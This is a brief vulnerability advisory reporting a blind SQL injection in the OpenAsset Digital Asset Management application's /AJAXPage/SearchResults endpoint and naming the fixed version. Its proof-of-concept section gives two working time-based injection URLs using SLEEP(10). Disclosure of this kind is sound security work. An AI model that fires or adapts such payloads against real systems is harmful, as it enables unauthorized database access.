1. Vulnerability Description

The OpenAsset Digital Asset Management application was vulnerable to a blind SQL injection, through the
/AJAXPage/SearchResults endpoint, via the "currentSearchItems" parameter.

2. PoC

The following requests will result in > 10 second delay in the response, due to the introduction of the SLEEP(10)
command into the SQL query:

<https://example.com/AJAXPage/SearchResults?currentSearchItems=newUpload:0=11>)%20AND%20(SELECT%20SLEEP(10))=1%23

<https://example.com/AJAXPage/SearchResults?currentSearchItems=album%3A1=196>)%20AND%20(SELECT+SLEEP(10)=1)%23

3. Solution

The vendor provides an updated version (11.4.10) which should be installed immediately. If using the cloud version, the
vendor has already updated it.
